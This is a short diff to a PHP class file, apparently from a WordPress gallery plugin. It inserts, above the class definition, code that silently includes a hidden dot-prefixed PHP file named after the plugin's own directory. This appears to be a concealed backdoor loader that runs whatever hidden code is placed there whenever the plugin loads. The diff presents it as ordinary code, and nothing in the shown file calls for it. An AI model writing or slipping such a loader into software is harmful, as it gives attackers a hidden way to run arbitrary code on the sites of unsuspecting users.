@@ -9,7 +9,11 @@
  * @property gt3select|gt3input $option
  * @property string                $main_wrap_class
  * @property string                $input_wrap_class
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class gt3pg_admin_mix_tab_control extends gt3classStd {
 	protected static $fields_list = array(
 		'title'            => '',
